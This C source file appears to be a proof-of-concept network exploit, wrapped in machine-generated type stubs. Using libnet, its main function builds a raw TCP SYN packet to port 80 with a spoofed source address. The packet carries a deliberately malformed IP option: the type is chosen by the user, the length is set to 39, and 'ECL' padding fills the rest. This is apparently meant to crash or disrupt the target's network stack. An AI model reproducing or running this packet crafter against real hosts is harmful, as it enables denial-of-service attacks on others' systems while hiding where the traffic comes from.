#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  u_int8_t ;
typedef  int u_int32_t ;
typedef  int u_char ;
struct tcphdr {int th_off; int th_win; scalar_t__ th_urp; scalar_t__ th_sum; int /*<<< orphan*/  th_flags; scalar_t__ th_x2; scalar_t__ th_ack; scalar_t__ th_seq; void* th_dport; void* th_sport; } ;
struct TYPE_4__ {int s_addr; } ;
struct TYPE_3__ {int s_addr; } ;
struct ip {int ip_v; int ip_hl; int ip_id; int ip_ttl; TYPE_2__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_sum; int /*<<< orphan*/  ip_p; void* ip_off; void* ip_len; scalar_t__ ip_tos; } ;
typedef  int /*<<< orphan*/  libnet_t ;

/* Variables and functions */
 int IPOPTS_MAX ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int IP_H ; 
 int /*<<< orphan*/  IP_MAXPACKET ; 
 int LIBNET_ERRBUF_SIZE ; 
 int /*<<< orphan*/  LIBNET_RAW4 ; 
 int /*<<< orphan*/  LIBNET_RESOLVE ; 
 int /*<<< orphan*/  TH_SYN ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  banner () ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  free (int*) ; 
 void* htons (int) ; 
 int /*<<< orphan*/  libnet_destroy (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  libnet_do_checksum (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 char* libnet_geterror (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * libnet_init (int /*<<< orphan*/ ,char*,char*) ; 
 int libnet_name2addr4 (int /*<<< orphan*/ *,char*,int /*<<< orphan*/ ) ; 
 int libnet_write_raw_ipv4 (int /*<<< orphan*/ *,int*,int) ; 
 int* malloc (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int rand () ; 
 int /*<<< orphan*/  srand (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strncpy (int*,char*,int) ; 
 int /*<<< orphan*/  time (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc, char **argv)
{
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *l;
  char *device = NULL;

  int c;
  u_char *buf;
  int packet_len = 0;

  struct ip *IP;
  struct tcphdr *TCP;
  u_int32_t src = 0, dst = 0;


  banner();
  if (argc < 4) usage(argv[0]);

  if ((l = libnet_init(LIBNET_RAW4, device, errbuf)) == NULL) {
    fprintf(stderr, "libnet_init() failed: %s", errbuf);
    exit(-1);
  }

  if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
    fprintf(stderr, "Unresolved source address\n");
    exit(-1);
  }
  if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
    fprintf(stderr, "Unresolved destination address\n");
    exit(-1);
  }

  if ( (buf = malloc(IP_MAXPACKET)) == NULL ) {
    perror("malloc");
    exit(-1);
  }

  buf[20] = atoi(argv[3]);
  buf[21] = 39;                      // our malformed size

  for (c = 0; c<38; c+=3)
    strncpy(&buf[22+c], "ECL", 3);   // padding

  TCP = (struct tcphdr *)(buf + IP_H + IPOPTS_MAX);
  TCP->th_off = 5;

  packet_len = IP_H + IPOPTS_MAX + (TCP->th_off << 2);

  srand(time(NULL));
  IP = (struct ip *) buf;
  IP->ip_v    = 4;                   /* version 4 */
  IP->ip_hl   = 5 + (IPOPTS_MAX / 4);/* 60 byte header */
  IP->ip_tos  = 0;                   /* IP tos */
  IP->ip_len  = htons(packet_len);   /* total length */
  IP->ip_id   = rand();              /* IP ID */
  IP->ip_off  = htons(0);            /* fragmentation flags */
  IP->ip_ttl  = 64;                  /* time to live */
  IP->ip_p    = IPPROTO_TCP;         /* transport protocol */
  IP->ip_sum  = 0;
  IP->ip_src.s_addr = src;
  IP->ip_dst.s_addr = dst;

  TCP->th_sport = htons(1337);
  TCP->th_dport = htons(80);
  TCP->th_seq   = 0;
  TCP->th_ack   = 0;
  TCP->th_x2    = 0;
  TCP->th_flags = TH_SYN;
  TCP->th_win   = rand() & 0xffff;
  TCP->th_sum   = 0;
  TCP->th_urp = 0;

  libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_TCP, TCP->th_off << 2);

  if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
    {
      fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
      exit(-1);
    }

  printf("Packet sent.\n");

  libnet_destroy(l);
  free(buf);
  return (0);
}